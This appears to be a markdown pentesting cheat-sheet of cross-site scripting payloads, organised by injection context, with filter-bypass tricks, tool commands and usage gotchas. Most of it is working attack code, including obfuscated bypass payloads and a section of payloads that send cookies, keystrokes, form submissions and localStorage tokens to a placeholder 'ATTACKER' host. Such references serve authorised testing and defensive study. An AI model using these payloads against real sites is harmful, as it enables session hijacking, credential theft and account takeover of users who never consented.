# xss — Cross-Site Scripting payloads cheat-sheet

> **Payload pocket reference.** Paste any of these into a reflected/stored input to prove XSS.

---

## 🎯 First-try probes

```html
<script>alert(1)</script>
<svg/onload=alert(1)>
"><svg/onload=alert(1)>
'><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**Non-alert confirmation** (alerts are sometimes stripped):
```html
<script>document.title='XSS'</script>
<svg/onload=document.body.style.background='red'>
```

---

## 🎯 Context-aware payloads

### Reflected inside HTML body
```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

### Inside an attribute (e.g. `value="INPUT"`)
```html
"><svg/onload=alert(1)>
" autofocus onfocus=alert(1) x="
```

### Inside single-quoted attribute
```html
'><svg/onload=alert(1)>
' autofocus onfocus=alert(1) x='
```

### Inside a `<script>` block
```html
</script><svg/onload=alert(1)>
';alert(1)//
";alert(1)//
```

### Inside a URL / href
```
javascript:alert(1)
javascript:alert`1`
```

### Inside a comment `<!-- INPUT -->`
```html
--><svg/onload=alert(1)>
```

### Inside a `<textarea>` / `<title>`
```html
</textarea><svg/onload=alert(1)>
</title><svg/onload=alert(1)>
```

---

## 🔐 Filter bypass tricks

**Uppercase / mixed case**
```html
<ScRiPt>alert(1)</sCrIpT>
```

**No quotes / no spaces**
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

**Backtick / unicode**
```html
<script>alert`1`</script>
<script>\u0061lert(1)</script>
```

**HTML entities**
```html
<img src=x onerror=&#97;lert(1)>
```

**URL encoding (reflected in URL)**
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

**Double URL encoding**
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

**Bypassing `<script>` blacklist**
```html
<svg><script>alert(1)</script></svg>
<iframe srcdoc="<script>alert(1)</script>">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

**Bypassing `alert` blacklist**
```html
<svg/onload=window['al'+'ert'](1)>
<svg/onload=eval(atob('YWxlcnQoMSk='))>
<svg/onload=(alert)(1)>
```

**Bypassing `on*` event blacklist — newer event handlers**
```html
<details open ontoggle=alert(1)>
<audio src onerror=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 📦 Useful payloads for proof

**Steal cookie (DOM source)**
```html
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
<svg/onload=fetch('http://ATTACKER/?c='+document.cookie)>
```

**Keylogger**
```html
<script>document.onkeypress=e=>fetch('http://ATTACKER/?k='+e.key)</script>
```

**Form hijack**
```html
<script>document.forms[0].action='http://ATTACKER/'</script>
```

**Local storage / JWT exfil**
```html
<script>fetch('http://ATTACKER/?d='+btoa(JSON.stringify(localStorage)))</script>
```

---

## 🧰 Tooling

| Tool | Purpose |
|---|---|
| `XSStrike` | Automated reflected XSS scanner with bypasses |
| `dalfox` | Modern Go XSS scanner |
| `xsser` | Classic |
| `kxss` | Finds reflected params |
| BeEF | XSS post-exploitation framework (`beef-xss`) |
| Burp Intruder | Fuzz with payload lists |

```bash
dalfox url "http://target/search?q=test"
xsstrike -u "http://target/search?q=test"
```

Wordlists: [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection), SecLists `Fuzzing/XSS/`.

---

## ⚠️ Gotchas

- Modern browsers block `alert()` inside sandboxed iframes — use `console.log` or data exfil.
- CSP (`Content-Security-Policy`) can block inline JS → check `Content-Security-Policy` response header first.
- HTTPOnly cookies are **not** readable via `document.cookie`.
- Stored XSS needs the payload to survive HTML sanitisation — test simpler tags first.
- Always check **where** your input is reflected (body / attribute / JS / URL) before crafting the payload.

---

## 🔗 Related

- [burpsuite](burpsuite.md) · [sqlmap](sqlmap.md) · [nuclei](nuclei.md) · [ffuf](ffuf.md)
